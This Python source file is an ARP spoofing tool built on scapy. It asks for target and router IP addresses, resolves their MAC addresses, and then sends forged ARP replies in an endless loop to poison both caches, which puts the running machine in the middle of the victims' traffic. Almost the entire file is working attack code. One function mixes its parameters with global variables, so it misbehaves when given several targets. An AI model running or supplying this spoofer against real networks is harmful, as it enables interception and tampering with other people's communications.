import time

from scapy.all import srp, send
from scapy.layers.l2 import Ether, ARP

from portScanner import check_ip


def get_mac_address(ip_address):
    broadcast_layer = Ether(dst='ff:ff:ff:ff:ff:ff')  # broadcast layer
    arp_layer = ARP(pdst=ip_address)  # arplayer
    get_mac_packet = broadcast_layer / arp_layer  # full packet to send
    answer = srp(get_mac_packet, timeout=2, verbose=False)[0]
    return answer[0][1].hwsrc


def spoof(routerIP, targetIP, routerMAC, targetMac):
    packet1 = ARP(op=2, hwdst=routerMAC, pdst=routerIP, psrc=targetIP)
    packet2 = ARP(op=2, hwdst=targetMac, pdst=target_ip, psrc=router_ip)
    send(packet1)
    send(packet2)


if __name__ == '__main__':
    try:
        tip, rip = False, False
        target_ip, router_ip = str(), str()
        list_of_target_ips = list()
        while not tip:  # if theres a error in the target ip
            target_ip = input('[+] Enter Target ip): ').strip(' ')
            if ',' in target_ip:
                for ip_add in target_ip.split(','):
                    if check_ip(ip_add) == ip_add:  # check if its a valid ip
                        tip = True
                    else:  # if not print ask the question again, by breaking the loop
                        print(ip_add + 'not an ip address')
                        tip = False
                        break
            if ',' not in target_ip:
                if check_ip(target_ip) == target_ip:  # check if its a valid ip
                    tip = True
                else:  # if not print the error and ask the question again, by breaking the loop
                    print(target_ip + 'not an ip address')
                    tip = False

        for ips in target_ip.split(','):  # places targets in this array
            list_of_target_ips.append(ips)
        print(list_of_target_ips)
        while not rip:  # if theres a error in the target ip
            router_ip = input('[+] Enter Router ip): ').strip(' ')
            if check_ip(router_ip) == router_ip:  # check if its a valid ip
                rip = True
            else:  # if not print the error and ask the question again, by breaking the loop
                print(router_ip + 'not an ip address')
                print('try again\n')
                rip = False
    except KeyboardInterrupt:
        print('\nClosing ARP Spoofer.')
        exit(0)
    else:
        try:
            list_of_target_macs = list()
            for ip in list_of_target_ips:
                list_of_target_macs.append(str(get_mac_address(ip)))

            router_mac = str(get_mac_address(router_ip))
            print(router_mac)
            print(list_of_target_macs)
        except IndexError:
            print("Mac Address of " + ip + " not found")
        except KeyboardInterrupt:
            print('bye')
        except:
            print('error connecting')
        else:
            try:
                while True:
                    for x in range(len(list_of_target_macs)):
                        print(x)
                        spoof(router_ip, list_of_target_ips[x], router_mac, list_of_target_macs[x])
                        time.sleep(
                            round(2 / len(list_of_target_macs), 2))  # ensures each ip is spoofed every to seconds

            except KeyboardInterrupt:
                print('Closing ARP Spoofer.')
                exit(0)
